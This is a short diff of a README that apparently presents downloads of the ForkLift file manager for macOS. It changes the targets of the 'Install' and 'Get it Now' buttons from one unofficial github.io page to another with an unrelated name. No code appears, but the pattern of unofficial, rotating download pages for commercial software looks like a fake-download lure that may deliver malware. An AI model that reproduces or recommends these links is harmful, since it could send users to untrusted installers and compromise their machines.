@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/forkLift)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/forkLift)
 
 </div>
 
@@ -81,7 +81,7 @@ ForkLift's dual-pane interface provides the spatial clarity that makes file oper
 
 <p align="center">
 
-[![Get it Now ForkLift](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/forkLift)
+[![Get it Now ForkLift](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/forkLift)
 
 </p>
 
